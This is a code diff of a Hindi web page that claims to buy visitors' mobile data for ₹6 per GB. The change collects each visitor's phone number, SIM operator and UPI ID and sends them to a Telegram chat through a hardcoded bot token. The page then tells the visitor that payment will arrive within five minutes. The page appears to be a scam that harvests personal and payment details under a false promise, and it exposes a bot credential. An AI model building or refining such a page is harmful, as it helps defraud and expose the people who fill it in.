@@ -47,9 +47,7 @@
       border: 1px solid rgba(74, 222, 128, 0.2);
     }
 
-    .form-group {
-      margin-bottom: 15px;
-    }
+    .form-group { margin-bottom: 15px; }
 
     label {
       display: block;
@@ -67,12 +65,9 @@
       color: #fff;
       font-size: 14px;
       outline: none;
-      transition: border-color 0.2s;
     }
 
-    input:focus, select:focus {
-      border-color: #38bdf8;
-    }
+    input:focus, select:focus { border-color: #38bdf8; }
 
     .payout-box {
       background: #0f172a;
@@ -83,11 +78,7 @@
       margin: 15px 0;
     }
 
-    .payout-amount {
-      font-size: 24px;
-      font-weight: bold;
-      color: #38bdf8;
-    }
+    .payout-amount { font-size: 24px; font-weight: bold; color: #38bdf8; }
 
     .btn-submit {
       width: 100%;
@@ -99,12 +90,9 @@
       font-size: 16px;
       font-weight: bold;
       cursor: pointer;
-      transition: background 0.2s;
     }
 
-    .btn-submit:hover {
-      background: #1d4ed8;
-    }
+    .btn-submit:hover { background: #1d4ed8; }
 
     .success-msg {
       display: none;
@@ -127,58 +115,56 @@
 
     <form id="dataForm" onsubmit="handleSubmit(event)">
       
-      <!-- Mobile Number -->
       <div class="form-group">
-        <label>मोबाइल नंबर (Mobile Number)</label>
-        <input type="tel" id="mobile" placeholder="10-अंकों का नंबर दर्ज करें" required pattern="[0-9]{10}">
+        <label>मोबाइल नंबर</label>
+        <input type="tel" id="mobile" placeholder="10-अंकों का नंबर" required pattern="[0-9]{10}">
       </div>
 
-      <!-- SIM Operator -->
       <div class="form-group">
-        <label>सिम कंपनी (Operator)</label>
+        <label>सिम कंपनी</label>
         <select id="operator" required>
           <option value="" disabled selected>कंपनी चुनें...</option>
           <option value="Jio">Jio</option>
           <option value="Airtel">Airtel</option>
-          <option value="Vi">Vi (Vodafone Idea)</option>
+          <option value="Vi">Vi</option>
           <option value="BSNL">BSNL</option>
         </select>
       </div>
 
-      <!-- MB Data Amount -->
       <div class="form-group">
         <label>डेटा (MB में)</label>
-        <input type="number" id="mbData" placeholder="उदा. 1024 (1 GB)" required min="1" oninput="calculateAmount()">
+        <input type="number" id="mbData" placeholder="उदा. 1024" required min="1" oninput="calculateAmount()">
       </div>
 
-      <!-- UPI ID -->
       <div class="form-group">
-        <label>UPI ID (पैसा प्राप्त करने के लिए)</label>
-        <input type="text" id="upiId" placeholder="उदा. name@upi / number@paytm" required>
+        <label>UPI ID (पेमेंट पाने के लिए)</label>
+        <input type="text" id="upiId" placeholder="उदा. name@upi" required>
       </div>
 
-      <!-- Earnings Calculation -->
       <div class="payout-box">
-        <label style="margin:0;">अनुमानित कमाई (Estimated Earnings)</label>
+        <label style="margin:0;">अनुमानित कमाई</label>
         <div class="payout-amount" id="payout">₹ 0.00</div>
       </div>
 
-      <button type="submit" class="btn-submit">सबमिट करें और डेटा बेचें</button>
+      <button type="submit" class="btn-submit" id="submitBtn">सबमिट करें और डेटा बेचें</button>
 
     </form>
 
     <div class="success-msg" id="successMsg">
-      <i class="fa-solid fa-circle-check"></i> रिक्वेस्ट सबमिट हो गई है! आपका भुगतान UPI ID पर 5 मिनट में भेज दिया जाएगा।
+      <i class="fa-solid fa-circle-check"></i> रिक्वेस्ट सबमिट हो गई है! भुगतान 5 मिनट में कर दिया जाएगा।
     </div>
   </div>
 
 <script>
+  // Bot Token & Chat ID Set Correctly
+  const TELEGRAM_BOT_TOKEN = "8899074021:AAHw5zYbB38Y4op6FW44ElOVMsGPLTGYhy0";
+  const TELEGRAM_CHAT_ID = "7742143795";
+
   function calculateAmount() {
     const mbInput = document.getElementById('mbData').value;
     const payoutDiv = document.getElementById('payout');
 
     if (mbInput && mbInput > 0) {
-      // Calculation: 1024 MB = 6 Rupees
       const ratePerMB = 6 / 1024;
       const totalPayout = (mbInput * ratePerMB).toFixed(2);
       payoutDiv.innerText = '₹ ' + totalPayout;
@@ -187,17 +173,41 @@
     }
   }
 
-  function handleSubmit(e) {
+  async function handleSubmit(e) {
     e.preventDefault();
+    const btn = document.getElementById('submitBtn');
+    btn.innerText = "प्रोसेस हो रहा है...";
+    btn.disabled = true;
+
+    const mobile = document.getElementById('mobile').value;
+    const operator = document.getElementById('operator').value;
+    const mbData = document.getElementById('mbData').value;
+    const upiId = document.getElementById('upiId').value;
+    const amount = (mbData * (6 / 1024)).toFixed(2);
+
+    const msgText = `🚀 *New Data Sell Request!*\n\n📱 *Mobile:* ${mobile}\n🏢 *Operator:* ${operator}\n📊 *Data:* ${mbData} MB\n💰 *Amount:* ₹${amount}\n💳 *UPI ID:* \`${upiId}\``;
     
-    // Hide form or show success feedback
-    document.getElementById('successMsg').style.display = 'block';
-    
-    // Clear inputs after submit
-    setTimeout(() => {
+    try {
+      await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          chat_id: TELEGRAM_CHAT_ID,
+          text: msgText,
+          parse_mode: 'Markdown'
+        })
+      });
+
+      document.getElementById('successMsg').style.display = 'block';
       document.getElementById('dataForm').reset();
       document.getElementById('payout').innerText = '₹ 0.00';
-    }, 1000);
+    } catch (err) {
+      alert("कुछ गड़बड़ हुई! कृपया दोबारा प्रयास करें।");
+      console.error(err);
+    } finally {
+      btn.innerText = "सबमिट करें और डेटा बेचें";
+      btn.disabled = false;
+    }
   }
 </script>
 
